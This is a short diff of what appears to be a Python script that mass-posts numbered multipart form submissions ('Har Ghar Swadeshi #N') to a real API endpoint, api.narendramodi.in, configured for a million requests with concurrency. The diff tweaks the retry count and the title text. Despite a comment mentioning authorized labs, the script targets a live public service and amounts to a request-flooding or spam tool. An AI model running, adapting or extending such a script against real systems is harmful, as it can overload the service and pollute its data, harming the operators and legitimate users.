@@ -9,7 +9,7 @@ URL = "https://api.narendramodi.in/mlapiv1"   # ⛔ replace ONLY in authorized l
 BOUNDARY = "Boundary+TEST123456"
 
 CONCURRENCY = 4
-MAX_RETRIES = 3
+MAX_RETRIES = 1
 TOTAL_REQUESTS = 1000000
 
 stop_flag = False
@@ -62,7 +62,7 @@ def build_body(index: int) -> str:
 
         f"--{BOUNDARY}\r\n"
         'Content-Disposition: form-data; name="title"\r\n\r\n'
-        f"Har Ghar Swadeshi, Ghar-Ghar Swadeshi #{index}\r\n"
+        f"Har Ghar Swadeshi, Ghar-Ghar Swadeshi 1#{index}\r\n"
 
         f"--{BOUNDARY}\r\n"
         'Content-Disposition: form-data; name="action"\r\n\r\n'
